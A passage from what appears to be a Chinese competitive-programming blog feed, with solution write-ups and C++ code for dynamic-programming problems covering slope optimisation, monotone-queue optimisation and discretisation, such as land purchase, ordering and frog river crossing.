class="line">        Queue[++tail]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[<span class="number">1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1330土地购买"><a href="#P1330土地购买" class="headerlink" title="P1330土地购买"></a>P1330土地购买</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>农夫<strong>John</strong>准备扩大他的农场,他正在考虑N (1 &lt;= N &lt;= 50,000) 块长方形的土地. 每块土地的长宽满足(1 &lt;= 宽 &lt;= 1,000,000; 1 &lt;= 长 &lt;= 1,000,000).</p>
</blockquote>
<p>每块土地的价格是它的面积,但FJ可以同时购买多快土地. 这些土地的价格是它们最大的长乘以它们最大的宽, 但是土地的长宽不能交换. 如果FJ买一块3x5的地和一块5x3的地,则他需要付5x5=25.</p>
<p>FJ希望买下所有的土地,但是他发现分组来买这些土地可以节省经费. 他需要你帮助他找到最小的经费.</p>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第1行: 一个数: N 第2..N+1行: 第i+1行包含两个数,分别为第i块土地的长和宽；</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>第一行: 最小的可行费用.</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>这道题恶心的强制全部地方long long ， cin 必须弃疗，排序算法写挂了导致检查不出来，while循环竟然head–（Runtime Error）！预处理各种异想天开，我的代码能力还是太弱了太弱了……</p>
<p>这道题需要预处理一下，将可以顺便带走的土地直接带走（长和宽都小于某一个土地我们就可以忽略它），然后排个序，将x长度上升，y长度下降（不要问我为什么，我也不知道……），然后就当成最普通的DP列出来状态转移方程。</p>
<p>然后一个斜率优化就过了……</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码:"></a>代码:</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> x;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> y;</span><br><span class="line">&#125;a[<span class="number">60000</span>],b[<span class="number">60000</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n,f[<span class="number">60000</span>],Max_x=<span class="number">0</span>,Max_y=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>,Queue[<span class="number">60000</span>],tail=<span class="number">0</span>,head=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mycmp</span><span class="params">(Edge a,Edge b)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> a.x==b.x?a.y&lt;b.y:a.x&lt;b.x;&#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Slope</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x,<span class="keyword">long</span> <span class="keyword">long</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> (<span class="keyword">double</span>)(f[x]-f[y])/(b[y+<span class="number">1</span>].y-b[x+<span class="number">1</span>].y); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(Queue,<span class="number">0</span>,<span class="keyword">sizeof</span>(Queue));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a[i].x&gt;&gt;a[i].y;</span><br><span class="line">    sort(a+<span class="number">1</span>,a+n+<span class="number">1</span>,mycmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(ans&amp;&amp;a[i].y&gt;=b[ans].y) ans--;</span><br><span class="line">        b[++ans].x=a[i].x;</span><br><span class="line">        b[ans].y=a[i].y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=ans;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(head&lt;tail&amp;&amp;Slope(Queue[head+<span class="number">1</span>],Queue[head])&lt;b[i].x) head++;</span><br><span class="line">        f[i]=f[Queue[head]]+b[i].x*b[Queue[head]+<span class="number">1</span>].y;</span><br><span class="line">        <span class="keyword">while</span>(head&lt;tail&amp;&amp;Slope(i,Queue[tail])&lt;Slope(Queue[tail],Queue[tail<span class="number">-1</span>])) tail--;</span><br><span class="line">        Queue[++tail]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[ans]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>斜率优化</tag>
      </tags>
  </entry>
  <entry>
    <title>DP单调性优化/DP离散化</title>
    <url>/2017/05/20/3ff705a47e38/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><ul>
<li>其实是动态规划深入讨论的一部分，但是由于内容比较多，所以拆开了。虽然动态规划的复杂度相对于搜索算法来说，已经很优秀了，是搜索算法的一种很强大的优化，但是DP在原来的基础上还是可以继续进行优化的，这其中一种方法就是利用单调性进行优化，适用范围还是挺广的。<br></li>
<li>单调性的优化其实就是利用你所列出来的状态转移方程中，进行变形，留下来真正的变量，剩下的已经确定的东西我们就可以不用去管了，只需要在真正的变量里面用低上一个维度或者低上更多的时间来得到这个变量的最优值，这种优化就是一种利用数学方面的DP优化。<br></li>
<li>其次就是DP类型的离散化类型的优化，我们只利用自己需要的值，对于一个维度特别大，达到远大于其他因素的时候，一般都是可以进行离散化优化的……学校的OJ里面大概有两三道题是比较好的，拉出来吧……</li>
</ul>
<h1 id="DP单调性优化"><a href="#DP单调性优化" class="headerlink" title="DP单调性优化"></a>DP单调性优化</h1><h2 id="P1326超级教主"><a href="#P1326超级教主" class="headerlink" title="P1326超级教主"></a>P1326超级教主</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><blockquote>
<p>LHX教主很能跳，因为Orz他的人太多了。教主跳需要消耗能量，每跳1米就会消耗1点能量，如果教主有很多能量就能跳很高。教主为了收集能量，来到了一个神秘的地方，这个地方凡人是进不来的。在这里，教主的正上方每100米处就有一个能量球（也就是这些能量球位于海拔100，200，300……米处），每个能量球所能提供的能量是不同的，一共有N个能量球（也就是最后一个能量球在N×100米处）。教主为了想收集能量，想跳着吃完所有的能量球。教主可以自由控制他每次跳的高度，接着他跳起把这个高度以下的能量球都吃了，他便能获得能量球内的能量，接着吃到的能量球消失。教主不会轻功，教主不会二段跳，所以教主不能因新吃到的能量而变化此次跳跃的高度。并且教主还是生活在地球上的，所以教主每次跳完都会掉下来。</p>
</blockquote>
<ul>
<li>问教主若要吃完所有的能量球，最多还能保留多少能量。</li>
</ul>
<h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h3><blockquote>
<ol>
<li>第1行包含两个正整数N，M，表示了能量球的个数和LHX教主的初始能量。</li>
<li>第2行包含N个非负整数，从左到右第I个数字依次从下向上描述了位于I×100米位置能量球包含</li>
</ol>
</blockquote>
<h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><blockquote>
<p>仅包括一个非负整数，为教主吃完所有能量球后最多保留的能量。</p>
</blockquote>
<h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>这道题……也是挺强的，是一道单调性优化的入门级题目QAQ</p>
<p>我们设置一下状态f[i]表示的是最后一次跳跃能吃到第i个能量球之后所能保留的最大能量，其中进行一下预处理a[i]表示前i个能量球的前缀和，然后列出状态转移方程：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">f[i]=max(f[i],f[j]+a[i]-a[j]<span class="number">-100</span>*i)</span><br></pre></td></tr></table></figure>
<p>状态转移方程列出来之后，我们发现还是无法解决这道题，毕竟200w的数据范围双重循环你还是想太多了，那么怎么才能优化成O(N)级别的算法呢，降低状态设置的维度吗？少年这是不可能的，都是一维了怎么降，那么我们只能从寻找最优值开始想办法，在O(1)的时间里面找到f[i]的最优值。</p>
<p>那么我们就开始将方程进行一个小小的变形吧！</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">f[i]=max(f[i],(f[j]-a[j])<span class="number">-100</span>*i)</span><br></pre></td></tr></table></figure>
<p>看到了扩号里面的内容了吗，在这个方程中，只有加粗的内容是不确定的，是需要用一维枚举来的出来的，那么能O(1)解决吗？如果我们能够直接得出f[j]-a[j]的最大值，那是不是直接加上去就好了，根本不需要找。</p>
<p>我们可以用一个单调队列来存下来最优的f[j]-a[j]的最优值，因为是单调队列，所以队头的元素就是最优值，之所以用队列进行存储的原因就是因为可能你现在有的能量，也就是f[j]不足以支持你跳跃到i这个位置，所以说需要用队列不断的淘汰不合法的值并且更新更优的值。</p>
<p>更新的时候在队尾用while来更新，因为可能有多个值可以被更新掉，更新队头的时候也用while来淘汰不合法的值。</p>
<h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,a[<span class="number">2000001</span>],f[<span class="number">2000001</span>];</span><br><span class="line"><span class="keyword">int</span> This,ans=<span class="number">0</span>,Line[<span class="number">2000001</span>],Start=<span class="number">1</span>,End=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    Line[Start]=<span class="number">0</span>;</span><br><span class="line">    f[<span class="number">0</span>]=m; a[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) a[i]+=a[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(f[Line[Start]]&lt;<span class="number">100</span>*i&amp;&amp;Start&lt;End) Start++;</span><br><span class="line">        f[i]=f[Line[Start]]+a[i]-a[Line[Start]]-i*<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">if</span>(f[i]-a[i]&gt;f[Line[End]]-a[Line[End]])</span><br><span class="line">        <span class="keyword">while</span>(f[i]-a[i]&gt;f[Line[End]]-f[Line[End]]) End--;</span><br><span class="line">        Line[++End]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="P1327HAOI订货"><a href="#P1327HAOI订货" class="headerlink" title="P1327HAOI订货"></a>P1327HAOI订货</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><blockquote>
<p>   某公司估计市场在第i个月对某产品的需求量为Ui，已知在第i月该产品的订货单价为di，上个月月底未销完的单位产品要付存贮费用m，假定第一月月初的库存量为零，第n月月底的库存量也为零，问如何安排这n个月订购计划，才能使成本最低？每月月初订购，订购后产品立即到货，进库并供应市场，于当月被售掉则不必付存贮费。假设仓库容量为S；</p>
</blockquote>
<h3 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h3><blockquote>
<ol>
<li>第1行：n,m,S (0&lt;=n&lt;=50,0&lt;=m&lt;=10,0&lt;=S&lt;=10000)</li>
<li>第2行：U1,U2,…,Ui,…,Un (0&lt;=Ui&lt;=10000)</li>
<li>第3行：d1,d2,…,di,…,dn (0&lt;=di&lt;=100)</li>
</ol>
</blockquote>
<h3 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h3><blockquote>
<p>只有1行，一个整数，代表最低成本；</p>
</blockquote>
<h3 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h3><p>这道题其实也是不错的题，但是网上大多人都说这是一道网络流的裸体，十几分钟敲完QAQ，这可是HA省省选啊，怎么可以弱成这个样子！结果自己式用DP加上单调性优化过去的。</p>
<p>我们设置状态 <code>f[i][j]</code> 表示第i个月存储数量为j货物所需要的最小成本，和往常一样，列出来他的状态转移方程：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">f[i][j]=min(f[i][j],f[i<span class="number">-1</span>][k]+(u[i]+j-k)*d[i]+m*k);</span><br></pre></td></tr></table></figure>
<p>相信这个转移方程还是很好理解的说，然后我们和上面的那道题一模一样，将这个可爱的方程小小的变形一下。把不确定的量列在一起，确定的放在一边不管；</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">f[i][j]=min(f[i][j],(f[i<span class="number">-1</span>][k]+(m-d[i])*k)+(u[i]+j)*d[i]);</span><br></pre></td></tr></table></figure>
<p>现在是不是有些思路了，没错我们需要保证 <code>(f[i-1][k]+(m-d[i])*k)</code> 这个是最小的就好了，那么我们就单独的用一个ans来记录下来最小的值（因为队头不会因为不合法的原因被淘汰掉，所以每次只需要保留最优值）。每次找出在 <code>min(u[i]+j,S)</code> 之前的 <code>f[i-1][k]</code> 的最优值赋给 <code>ans</code> 就好了。</p>
<h3 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,Price,S,f[<span class="number">100</span>][<span class="number">10001</span>];</span><br><span class="line"><span class="keyword">int</span> Pay[<span class="number">100</span>],Need[<span class="number">100</span>],ans;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;Price&gt;&gt;S;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">cin</span>&gt;&gt;Need[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">cin</span>&gt;&gt;Pay[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=S;i++) f[<span class="number">0</span>][i]=<span class="number">123456789</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k=<span class="number">0</span>,ans=<span class="number">123456789</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=S;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(;k&lt;=min(Need[i]+j,S);k++)</span><br><span class="line">            ans=min(ans,f[i<span class="number">-1</span>][k]+k*(Price-Pay[i]));</span><br><span class="line">            f[i][j]=ans+(Need[i]+j)*Pay[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[n][<span class="number">0</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h3><blockquote>
<p>关于单调性优化的题目就到这里了，感谢闵神的讲稿，很详细，写的很认真，看起来比较通俗易懂，而且注重<strong>思维</strong>的引导！</p>
</blockquote>
<h1 id="DP离散化"><a href="#DP离散化" class="headerlink" title="DP离散化"></a>DP离散化</h1><h2 id="P1309过河"><a href="#P1309过河" class="headerlink" title="P1309过河"></a>P1309过河</h2><h3 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h3><blockquote>
<ul>
<li>在河上有一座独木桥，一只青蛙想沿着独木桥从河的一侧跳到另一侧。在桥上有一些石子，青蛙很讨厌踩在这些石子上。由于桥的长度和青蛙一次跳过的距离都是正整数，我们可以把独木桥上青蛙可能到达的点看成数轴上的一串整点：0，1，……，L（其中L是桥的长度）。坐标为0的点表示桥的起点，坐标为L的点表示桥的终点。青蛙从桥的起点开始，不停的向终点方向跳跃。一次跳跃的距离是S到T之间的任意正整数（包括S,T）。当青蛙跳到或跳过坐标为L的点时，就算青蛙已经跳出了独木桥。</li>
<li>题目给出独木桥的长度L，青蛙跳跃的距离范围S,T，桥上石子的位置。你的任务是确定青蛙要想过河，最少需要踩到的石子数。对于30%的数据，L &lt;= 10000；对于全部的数据，L &lt;= 10^9。</li>
</ul>
</blockquote>
<h3 id="输入：-2"><a href="#输入：-2" class="headerlink" title="输入："></a>输入：</h3><blockquote>
<p>输入的第一行有一个正整数L（1 &lt;= L &lt;= 10^9），表示独木桥的长度。第二行有三个正整数S，T，M，分别表示青蛙一次跳跃的最小距离，最大距离，及桥上石子的个数，其中1 &lt;= S &lt;= T &lt;= 10，1 &lt;= M &lt;= 100。第三行有M个不同的正整数分别表示这M个石子在数轴上的位置（数据保证桥的起点和终点处没有石子）。所有相邻的整数之间用一个空格隔开。</p>
</blockquote>
<h3 id="输出：-2"><a href="#输出：-2" class="headerlink" title="输出："></a>输出：</h3><blockquote>
<p>输出只包括一个整数，表示青蛙过河最少需要踩到的石子数。</p>
</blockquote>
<h3 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h3><p>首先我们看完题，差不多状态转移方程都是能列出来的，我们设f[i]表示到达坐标i的时候踩到的最小石子数量，然后每次跟新的时候从前面能到达的地方开始寻找，大概是从i-max_jump到i-min_jump这个范围，然后找出最少的一个，然后验证，如果这个坐标是有石子的+1；</p>
<p>那么很简单，但是看题目10^9的范围，虽然是不纯粹的二重循环，但是还是要超时的。那么我们能不能在10^9上面做文章。</p>
<p>离散化的思想就是保留下来自己需要的，不需要的进行抛弃，那么我们需要的是什么？题目中的石子数量最大也不过是100，也就是说M&lt;&lt;L的，所以说我们需要的是M，两个M之间很长很长的一部分是完全不需要的，我们就可以抛弃这些，但是问题是抛弃哪些呢？</p>
<p>我们在第一个点，开始向2,3,4,5…….这些跳跃的时候，有些是不可能达不到的，有些是肯定能达到的，那么是哪些不可能达到，哪些必定能达到呢。举一下例子吧，其中1表示可以到达，0表示不能达到，第几个数表示坐标。</p>
<p>当跳跃范围是3-4的时候：1 0 1 1 0 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1……</p>
<p>当跳跃范围是2-4的时候：1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1……</p>
<p>当跳跃范围是4-5的时候：1 0 0 1 1 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1……</p>
<p>没错，规律就是这样，在min<em>max之后的点是必定能到达的（其实并不精确，但是这句话一定是成立的），具体证明并不会，但是不妨碍做题。也就是说如果距离大于min</em>max的时候，我们就可以把他们缩减到min*max，这样就可以避免很多不必要的坐标计算。</p>
<p>还有，记得有一种情况就是max等于min的时候，这种时候需要单独处理。</p>
<h3 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> Brige,Max_long,Min_long,n,m;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">201</span>],b[<span class="number">201</span>],f[<span class="number">1000001</span>],ans=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">bool</span> Get[<span class="number">10000001</span>],Arrived[<span class="number">10000001</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> The_max;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">    <span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="keyword">sizeof</span>(b));</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(Get,<span class="literal">false</span>,<span class="keyword">sizeof</span>(Get));</span><br><span class="line">    <span class="built_in">memset</span>(Arrived,<span class="literal">false</span>,<span class="keyword">sizeof</span>(Arrived));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;Brige&gt;&gt;Min_long&gt;&gt;Max_long&gt;&gt;n;</span><br><span class="line">    a[n+<span class="number">1</span>]=Brige;</span><br><span class="line">    Arrived[<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">    Brige=Max_long*Min_long;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    sort(a+<span class="number">1</span>,a+n+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n+<span class="number">1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]-a[i<span class="number">-1</span>]&gt;Brige)</span><br><span class="line">        b[i]=b[i<span class="number">-1</span>]+Max_long+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> b[i]=b[i<span class="number">-1</span>]+a[i]-a[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">if</span>(i==n+<span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span> Get[b[i]]=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Brige=b[n+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(Max_long==Min_long)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> all=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]%Max_long==<span class="number">0</span>)</span><br><span class="line">            all++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;all&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Min_long;i&lt;=Brige+Max_long<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        f[i]=f[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=Min_long;j&lt;=Max_long;j++)</span><br><span class="line">        <span class="keyword">if</span>(Arrived[i-j]==<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            f[i]=min(f[i],f[i-j]);</span><br><span class="line">            Arrived[i]=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(Get[i]==<span class="literal">true</span>) f[i]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Brige;i&lt;=Brige+Max_long<span class="number">-1</span>;i++)</span><br><span class="line">    ans=min(ans,f[i]);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>离散化</tag>
      </tags>
  </entry>
  <entry>
    <title>二维动态规划</title>
    <url>/2017/05/20/090d5cc24db3/</url>
    <content><![CDATA[<h1 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h1><h2 id="一天前："><a href="#一天前：" class="headerlink" title="一天前："></a>一天前：</h2><blockquote>
<p>两天啃完吧，重要的是真正学会这个知识点，特意放慢脚步……前两天一天一个小专题真是搞得太紧张，好多都没有弄太懂QAQ</p>
</blockquote>
<h2 id="一天后："><a href="#一天后：" class="headerlink" title="一天后："></a>一天后：</h2><blockquote>
<p>QAQ说好的两天的，结果一天都搞完了，mmp，可能是题目比较水的原因吧，大多都是自己认真想出来的，有时候对于题目的理解不太对，导致自己一直想不对，比如P1295创意吃鱼，我这语文理解能力啊QAQ太弱了……</p>
</blockquote>
<h1 id="P1295创意吃鱼"><a href="#P1295创意吃鱼" class="headerlink" title="P1295创意吃鱼"></a>P1295创意吃鱼</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<ul>
<li>可爱猫猫家里长方形大池子中有很多鱼，她开始思考：到底要以何种方法吃鱼呢（猫猫就是这么可爱，吃鱼也要想好吃法 。她发现，把大池子视为01矩阵（0表示对应位置无鱼，1表示对应位置有鱼）有助于决定吃鱼策略。</li>
<li>在代表池子的01矩阵中，有很多的正方形子矩阵，如果某个正方形子矩阵的某条对角线上都有鱼，且此正方形子矩阵的其他地方无鱼，猫猫就可以从这个正方形子矩阵“对角线的一端”下口，只一吸，就能把对角线上的那一队鲜鱼吸入口中。</li>
